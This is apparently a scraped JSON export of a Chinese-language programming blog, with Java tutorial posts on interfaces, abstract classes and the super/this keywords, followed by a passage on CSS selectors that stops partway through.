多个父接口当中的默认方法如果重复，那么子接口必须进行默认方法的覆盖重写，【而且带着default关键字】。 12345package cn.itcast.day10.demo03;public class Demo01Relations &#123;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"AAA\"); &#125;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"BBB\"); &#125;&#125; 123456789101112131415161718package cn.itcast.day10.demo03;/*这个子接口当中有几个方法？答：4个。methodA 来源于接口AmethodB 来源于接口BmethodCommon 同时来源于接口A和Bmethod 来源于我自己 */public interface MyInterface extends MyInterfaceA, MyInterfaceB &#123; public abstract void method(); @Override public default void methodDefault() &#123; &#125;&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo03;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method() &#123; &#125; @Override public void methodA() &#123; &#125; @Override public void methodB() &#123; &#125; @Override public void methodCommon() &#123; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承父类并实现多个接口","slug":"java00101继承父类并实现多个接口","date":"2020-03-10T12:49:17.000Z","updated":"2020-03-10T13:23:12.241Z","comments":true,"path":"2020/03/10/java00101继承父类并实现多个接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00101继承父类并实现多个接口/","excerpt":"","text":"java继承父类并实现多个接口 使用接口的时候，需要注意： 接口是没有静态代码块或者构造方法的。 12345678910111213141516package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; // 错误写法！接口不能有静态代码块// static &#123;//// &#125; // 错误写法！接口不能有构造方法// public MyInterfaceA() &#123;//// &#125;&#125; 一个类的直接父类是唯一的，但是一个类可以同时实现多个接口。 格式： 123public class MyInterfaceImpl implements MyInterfaceA, MyInterfaceB &#123; // 覆盖重写所有抽象方法&#125; 如果实现类所实现的多个接口当中，存在重复的抽象方法，那么只需要覆盖重写一次即可。 1234567891011121314151617181920package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; @Override public void methodA() &#123; &#125; //只需要覆盖重写一次 @Override public void methodAbs() &#123; &#125; @Override public void methodDefault() &#123; &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 如果实现类没有覆盖重写所有接口当中的所有抽象方法，那么实现类就必须是一个抽象类。 12345package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //不重写抽象方法&#125; 如果实现类锁实现的多个接口当中，存在重复的默认方法，那么实现类一定要对冲突的默认方法进行覆盖重写。 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //重写默认方法 @Override public void methodDefault() &#123; &#125;&#125; 一个类如果直接父类当中的方法，和接口当中的默认方法产生了冲突，优先用父类当中的方法。 123456789package cn.itcast.day10.demo02;public interface MyInterface &#123; public default void method() &#123; System.out.println(\"接口的默认方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo02;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234package cn.itcast.day10.demo02;public class Zi extends Fu implements MyInterface &#123;&#125; 123456789101112package cn.itcast.day10.demo02;public class Demo01Interface &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); //这里调用的是父类的method方法 zi.method(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的内容小结","slug":"java00100接口的内容小结","date":"2020-03-10T08:15:18.000Z","updated":"2020-03-10T09:38:56.219Z","comments":true,"path":"2020/03/10/java00100接口的内容小结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00100接口的内容小结/","excerpt":"","text":"java接口的内容小结","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的常量定义和使用","slug":"java00099接口的常量定义和使用","date":"2020-03-10T08:10:04.000Z","updated":"2020-03-10T09:38:15.569Z","comments":true,"path":"2020/03/10/java00099接口的常量定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00099接口的常量定义和使用/","excerpt":"","text":"java接口的常量定义和使用 接口当中也可以定义“成员变量”，但是必须使用public static final三个关键字进行修饰。 从效果上看，这其实就是接口的【常量】。 格式： public static final 数据类型 常量名称 = 数据值; 备注： 一旦使用final关键字进行修饰，说明不可改变。 使用接口常量格式: 接口名.常量名 注意事项： 接口当中的常量，可以省略public static final，注意：不写也照样是这样。 接口当中的常量，必须进行赋值；不能不赋值。 接口中常量的名称，使用完全大写的字母，用下划线进行分隔。（推荐命名规则） 12345678package cn.itcast.day10.demo01;public interface MyInterfaceConst &#123; // 这其实就是一个常量，一旦赋值，不可以修改 public static final int NUM_OF_MY_CLASS = 12;&#125; 1234567891011package cn.itcast.day10.demo01;public class Demo05Interface &#123; public static void main(String[] args) &#123; // 访问接口当中的常量 System.out.println(MyInterfaceConst.NUM_OF_MY_CLASS); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法使用","slug":"java00098接口的私有方法使用","date":"2020-03-10T08:00:22.000Z","updated":"2020-03-10T09:34:40.434Z","comments":true,"path":"2020/03/10/java00098接口的私有方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00098接口的私有方法使用/","excerpt":"","text":"java接口的私有方法使用 12345678910package cn.itcast.day10.demo01;public class MyInterfacePrivateAImpl implements MyInterfacePrivateA &#123; public void methodAnother() &#123; // 直接访问到了接口中的默认方法，这样是错误的！// methodCommon(); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateB &#123; public static void methodStatic1() &#123; System.out.println(\"静态方法1\"); methodStaticCommon(); &#125; public static void methodStatic2() &#123; System.out.println(\"静态方法2\"); methodStaticCommon(); &#125; private static void methodStaticCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo01;public class Demo04Interface &#123; public static void main(String[] args) &#123; MyInterfacePrivateB.methodStatic1(); MyInterfacePrivateB.methodStatic2(); // 错误写法！// MyInterfacePrivateB.methodStaticCommon(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法定义","slug":"java00097接口的私有方法定义","date":"2020-03-10T07:47:52.000Z","updated":"2020-03-10T09:33:17.716Z","comments":true,"path":"2020/03/10/java00097接口的私有方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00097接口的私有方法定义/","excerpt":"","text":"java接口的私有方法定义 问题描述： 我们需要抽取一个共有方法，用来解决两个默认方法之间重复代码的问题。 但是这个共有方法不应该让实现类使用，应该是私有化的。 解决方案： 从Java 9开始，接口当中允许定义私有方法。 普通私有方法，解决多个默认方法之间重复代码问题 格式： 123private 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 静态私有方法，解决多个静态方法之间重复代码问题 格式： 123private static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateA &#123; public default void methodDefault1() &#123; System.out.println(\"默认方法1\"); methodCommon(); &#125; public default void methodDefault2() &#123; System.out.println(\"默认方法2\"); methodCommon(); &#125; private void methodCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法使用","slug":"java00096接口的静态方法使用","date":"2020-03-10T07:44:40.000Z","updated":"2020-03-10T09:28:23.701Z","comments":true,"path":"2020/03/10/java00096接口的静态方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00096接口的静态方法使用/","excerpt":"","text":"java接口的静态方法使用 注意事项： 不能通过接口实现类的对象来调用接口当中的静态方法。 正确用法： 通过接口名称，直接调用其中的静态方法。 格式： 接口名称.静态方法名(参数); 1234package cn.itcast.day10.demo01;public class MyInterfaceStaticImpl implements MyInterfaceStatic &#123;&#125; 1234567891011121314151617package cn.itcast.day10.demo01;public class Demo03Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceStaticImpl impl = new MyInterfaceStaticImpl(); // 错误写法！// impl.methodStatic(); // 直接通过接口名称调用静态方法 MyInterfaceStatic.methodStatic(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法定义","slug":"java00095接口的静态方法定义","date":"2020-03-10T07:42:39.000Z","updated":"2020-03-10T09:26:13.981Z","comments":true,"path":"2020/03/10/java00095接口的静态方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00095接口的静态方法定义/","excerpt":"","text":"java接口的静态方法定义 从Java 8开始，接口当中允许定义静态方法。 格式： 123public static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 提示：就是将abstract或者default换成static即可，带上方法体。 123456789package cn.itcast.day10.demo01;public interface MyInterfaceStatic &#123; public static void methodStatic() &#123; System.out.println(\"这是接口的静态方法！\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法使用","slug":"java00094接口的默认方法使用","date":"2020-03-10T07:42:07.000Z","updated":"2020-03-10T09:22:41.199Z","comments":true,"path":"2020/03/10/java00094接口的默认方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00094接口的默认方法使用/","excerpt":"","text":"java接口的默认方法使用 接口的默认方法，可以通过接口实现类对象，直接调用。 接口的默认方法，也可以被接口实现类进行覆盖重写。 12345678910111213package cn.itcast.day10.demo01;public class MyInterfaceDefaultB implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，BBB\"); &#125; @Override public void methodDefault() &#123; System.out.println(\"实现类B覆盖重写了接口的默认方法\"); &#125;&#125; 12345678package cn.itcast.day10.demo01;public class MyInterfaceDefaultA implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，AAA\"); &#125;&#125; 12345678910111213141516171819202122232425package cn.itcast.day10.demo01;/*从Java 8开始，接口里允许定义默认方法。格式：public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125;备注：接口当中的默认方法，可以解决接口升级的问题。 */public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo01;public class Demo02Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceDefaultA a = new MyInterfaceDefaultA(); a.methodAbs(); // 调用抽象方法，实际运行的是右侧实现类。 // 调用默认方法，如果实现类当中没有，会向上找接口 a.methodDefault(); // 这是新添加的默认方法 System.out.println(\"==========\"); MyInterfaceDefaultB b = new MyInterfaceDefaultB(); b.methodAbs(); b.methodDefault(); // 实现类B覆盖重写了接口的默认方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法定义","slug":"java00093接口的默认方法定义","date":"2020-03-10T07:31:05.000Z","updated":"2020-03-10T09:18:22.169Z","comments":true,"path":"2020/03/10/java00093接口的默认方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00093接口的默认方法定义/","excerpt":"","text":"java接口的默认方法定义 从Java 8开始，接口里允许定义默认方法。 格式： 123public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 备注：接口当中的默认方法，可以解决接口升级的问题。 1234567891011121314151617package cn.itcast.day10.demo01;public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法使用","slug":"java00092接口的抽象方法使用","date":"2020-03-10T07:23:09.000Z","updated":"2020-03-10T09:39:27.098Z","comments":true,"path":"2020/03/10/java00092接口的抽象方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00092接口的抽象方法使用/","excerpt":"","text":"java接口的抽象方法使用 123456789101112131415161718192021222324252627package cn.itcast.day10.demo01;/*在任何版本的Java中，接口都能定义抽象方法。格式：public abstract 返回值类型 方法名称(参数列表);注意事项：1. 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract2. 这两个关键字修饰符，可以选择性地省略。（今天刚学，所以不推荐。）3. 方法的三要素，可以随意定义。 */public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo01;public class MyInterfaceAbstractImpl implements MyInterfaceAbstract &#123; @Override public void methodAbs1() &#123; System.out.println(\"这是第一个方法！\"); &#125; @Override public void methodAbs2() &#123; System.out.println(\"这是第二个方法！\"); &#125; @Override public void methodAbs3() &#123; System.out.println(\"这是第三个方法！\"); &#125; @Override public void methodAbs4() &#123; System.out.println(\"这是第四个方法！\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo01;public class Demo01Interface &#123; public static void main(String[] args) &#123; // 错误写法！不能直接new接口对象使用。// MyInterfaceAbstract inter = new MyInterfaceAbstract(); // 创建实现类的对象使用 MyInterfaceAbstractImpl impl = new MyInterfaceAbstractImpl(); impl.methodAbs1(); impl.methodAbs2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法定义","slug":"java00091接口的抽象方法定义","date":"2020-03-10T07:18:29.000Z","updated":"2020-03-10T09:07:33.695Z","comments":true,"path":"2020/03/10/java00091接口的抽象方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00091接口的抽象方法定义/","excerpt":"","text":"java接口的抽象方法定义 在任何版本的Java中，接口都能定义抽象方法。 格式： public abstract 返回值类型 方法名称(参数列表); 注意事项： 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract 这两个关键字修饰符，可以选择性地省略。 方法的三要素，可以随意定义。 123456789101112131415161718package cn.itcast.day10.demo01;public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的定义基本格式","slug":"java00090接口的定义基本格式","date":"2020-03-10T07:17:37.000Z","updated":"2020-03-10T09:04:55.060Z","comments":true,"path":"2020/03/10/java00090接口的定义基本格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00090接口的定义基本格式/","excerpt":"","text":"java接口的定义基本格式 接口就是多个类的公共规范。 接口是一种引用数据类型，最重要的内容就是其中的：抽象方法。 如何定义一个接口的格式： 123public interface 接口名称 &#123; // 接口内容&#125; 备注：换成了关键字interface之后，编译生成的字节码文件仍然是：.java --&gt; .class。 如果是Java 7，那么接口中可以包含的内容有： 常量 抽象方法 如果是Java 8，还可以额外包含有： 默认方法 静态方法 如果是Java 9，还可以额外包含有： 私有方法 接口使用步骤： 接口不能直接使用，必须有一个“实现类”来“实现”该接口。 格式： 123public class 实现类名称 implements 接口名称 &#123; // ...&#125; 接口的实现类必须覆盖重写（实现）接口中所有的抽象方法。 实现：去掉abstract关键字，加上方法体大括号。 创建实现类的对象，进行使用。 注意事项： 如果实现类并没有覆盖重写接口中所有的抽象方法，那么这个实现类自己就必须是抽象类。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口概述与生活举例","slug":"java00089接口概述与生活举例","date":"2020-03-10T07:14:15.000Z","updated":"2020-03-10T08:17:19.335Z","comments":true,"path":"2020/03/10/java00089接口概述与生活举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00089接口概述与生活举例/","excerpt":"","text":"java接口概述与生活举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的注意事项","slug":"java00088抽象方法和抽象类的注意事项","date":"2020-03-09T09:34:14.000Z","updated":"2020-03-09T11:17:06.579Z","comments":true,"path":"2020/03/09/java00088抽象方法和抽象类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00088抽象方法和抽象类的注意事项/","excerpt":"","text":"java抽象方法和抽象类的注意事项 12345678910package cn.itcast.day09.demo12;public class DemoMain &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.eat(); &#125;&#125; 12345678910package cn.itcast.day09.demo12;/*一个抽象类不一定含有抽象方法，只要保证抽象方法所在的类是抽象类，即可。这样没有抽象方法的抽象类，也不能直接创建对象，在一些特殊场景下有用途。 */public abstract class MyAbstract &#123;&#125; 1234567891011package cn.itcast.day09.demo12;public abstract class Fu &#123; public Fu() &#123; System.out.println(\"抽象父类构造方法执行！\"); &#125; public abstract void eat();&#125; 1234567891011121314package cn.itcast.day09.demo12;public class Zi extends Fu &#123; public Zi() &#123; // super(); System.out.println(\"子类构造方法执行\"); &#125; @Override public void eat() &#123; System.out.println(\"吃饭饭\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的使用","slug":"java00087抽象方法和抽象类的使用","date":"2020-03-09T09:24:02.000Z","updated":"2020-03-09T11:13:02.607Z","comments":true,"path":"2020/03/09/java00087抽象方法和抽象类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00087抽象方法和抽象类的使用/","excerpt":"","text":"java抽象方法和抽象类的使用 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125; 123456789101112package cn.itcast.day09.demo11;public class DemoMain &#123; public static void main(String[] args) &#123;// Animal animal = new Animal(); // 错误写法！不能直接创建抽象类对象 Cat cat = new Cat(); cat.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的定义格式","slug":"java00086抽象方法和抽象类的定义格式","date":"2020-03-09T09:17:55.000Z","updated":"2020-03-09T11:12:22.050Z","comments":true,"path":"2020/03/09/java00086抽象方法和抽象类的定义格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00086抽象方法和抽象类的定义格式/","excerpt":"","text":"java抽象方法和抽象类的定义格式 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象的概念","slug":"java00085抽象的概念","date":"2020-03-09T09:14:57.000Z","updated":"2020-03-09T11:11:49.970Z","comments":true,"path":"2020/03/09/java00085抽象的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00085抽象的概念/","excerpt":"","text":"java抽象的概念","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的三个特点","slug":"java00084继承的三个特点","date":"2020-03-09T09:12:11.000Z","updated":"2020-03-09T10:53:28.821Z","comments":true,"path":"2020/03/09/java00084继承的三个特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00084继承的三个特点/","excerpt":"","text":"java继承的三个特点","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super与this关键字的图解","slug":"java00083super与this关键字的图解","date":"2020-03-09T09:11:29.000Z","updated":"2020-03-09T10:49:27.402Z","comments":true,"path":"2020/03/09/java00083super与this关键字的图解/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00083super与this关键字的图解/","excerpt":"","text":"super与this关键字的图解 123456789101112package cn.itcast.day09.demo10;public class Demo &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.show(); zi.method(); &#125;&#125; 1234567891011package cn.itcast.day09.demo10;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234567891011121314151617181920package cn.itcast.day09.demo10;public class Zi extends Fu &#123; int num = 20; @Override public void method() &#123; super.method(); // 调用了父类方法 System.out.println(\"子类方法\"); &#125; public void show() &#123; int num = 30; System.out.println(num); // 30 System.out.println(this.num); // 20 System.out.println(super.num); // 10 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字的三种用法","slug":"java00082this关键字的三种用法","date":"2020-03-09T09:10:59.000Z","updated":"2020-03-09T10:45:05.595Z","comments":true,"path":"2020/03/09/java00082this关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00082this关键字的三种用法/","excerpt":"","text":"this关键字的三种用法 super关键字用来访问父类内容，而this关键字用来访问本类内容。用法也有三种： 在本类的成员方法中，访问本类的成员变量。 在本类的成员方法中，访问本类的另一个成员方法。 在本类的构造方法中，访问本类的另一个构造方法。 在第三种用法当中要注意： A. this(…)调用也必须是构造方法的第一个语句，唯一一个。 B. super和this两种构造调用，不能同时使用。 1234567package cn.itcast.day09.demo09;public class Fu &#123; int num = 30;&#125; 12345678910111213141516171819202122232425262728293031323334353637package cn.itcast.day09.demo09;public class Zi extends Fu &#123; int num = 20; public Zi() &#123;// super(); // 这一行不再赠送 this(123); // 本类的无参构造，调用本类的有参构造// this(1, 2); // 错误写法！ &#125; public Zi(int n) &#123; this(1, 2); &#125; public Zi(int n, int m) &#123; &#125; public void showNum() &#123; int num = 10; System.out.println(num); // 局部变量 System.out.println(this.num); // 本类中的成员变量 System.out.println(super.num); // 父类中的成员变量 &#125; public void methodA() &#123; System.out.println(\"AAA\"); &#125; public void methodB() &#123; this.methodA(); System.out.println(\"BBB\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super关键字的三种用法","slug":"java00081super关键字的三种用法","date":"2020-03-09T09:10:33.000Z","updated":"2020-03-09T10:40:59.175Z","comments":true,"path":"2020/03/09/java00081super关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00081super关键字的三种用法/","excerpt":"","text":"super关键字的三种用法 super关键字的用法有三种： 在子类的成员方法中，访问父类的成员变量。 在子类的成员方法中，访问父类的成员方法。 在子类的构造方法中，访问父类的构造方法。 1234567891011package cn.itcast.day09.demo08;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day09.demo08;public class Zi extends Fu &#123; int num = 20; public Zi() &#123; super(); &#125; public void methodZi() &#123; System.out.println(super.num); // 父类中的num &#125; public void method() &#123; super.method(); // 访问父类中的method System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"继承中构造方法的访问特点","slug":"java00080继承中构造方法的访问特点","date":"2020-03-09T08:32:49.000Z","updated":"2020-03-09T08:40:02.049Z","comments":true,"path":"2020/03/09/java00080继承中构造方法的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00080继承中构造方法的访问特点/","excerpt":"","text":"继承中构造方法的访问特点 继承关系中，父子类构造方法的访问特点： 子类构造方法当中有一个默认隐含的“super()”调用，所以一定是先调用的父类构造，后执行的子类构造。 子类构造可以通过super关键字来调用父类重载构造。 super的父类构造调用，必须是子类构造方法的第一个语句。不能一个子类构造调用多次super构造。 总结： 子类必须调用父类构造方法，不写则赠送super()；写了则用写的指定的super调用，super只能有一个，还必须是第一个。 1234567public class Demo01Constructor &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); &#125;&#125; 12345678910111213package cn.itcast.day09.demo07;public class Fu &#123; public Fu() &#123; System.out.println(\"父类无参构造\"); &#125; public Fu(int num) &#123; System.out.println(\"父类有参构造！\"); &#125;&#125; 123456789101112131415package cn.itcast.day09.demo07;public class Zi extends Fu &#123; public Zi() &#123; super(); // 在调用父类无参构造方法// super(20); // 在调用父类重载的构造方法 System.out.println(\"子类构造方法！\"); &#125; public void method() &#123;// super(); // 错误写法！只有子类构造方法，才能调用父类构造方法。 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常用选择器","slug":"html-css00018常用选择器","date":"2020-03-07T14:29:08.000Z","updated":"2020-05-29T23:05:20.938Z","comments":true,"path":"2020/03/07/html-css00018常用选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00018常用选择器/","excerpt":"","text":"常用选择器 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名{} 例子：p{} h1{} div{} 1234567 p&#123;color: red;&#125;h1&#123;color: green;&#125; id选择器 作用：根据元素的id属性值选中一个元素 语法：#id属性值{} 调用:id=&quot;属性值&quot; 例子：#box{} #red{} 123#red&#123;color: red;&#125; 类选择器 作用：根据元素的class属性值选中一组元素 id是唯一性的,所以只能应用到一个元素上 语法：.class属性值 调用: class=&quot;属性值1 [属性值2 属性值n]&quot; 1234567 .blue&#123;color: blue;&#125;.abc&#123;font-size: 20px;&#125; 复合选择器(并集选择器) 语法: 选择器1,选择器2,选择器n{} 123.class,h1,#a&#123;background-color: red;&#125; 复合选择器(交集选择器) 作用:可以选中同时满足多个选择器的元素 语法: 选择器1选择器2选择器N{} 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;style type=\"text/css\"&gt; span.p3&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;span class=\"p3\"&gt;I love you!&lt;/span&gt; &lt;/body&gt;&lt;/html&gt; 通配选择器 作用：选中页面中的所有元素 语法: *{} 123*&#123;color: red;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; /* 将所有的段落设置为红色（字体） 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名&#123;&#125; 例子：p&#123;&#125; h1&#123;&#125; div&#123;&#125; */ /* p&#123; color: red; &#125; h1&#123; color: green; &#125; */ /* 将儿童相见不相识设置红色 id选择器 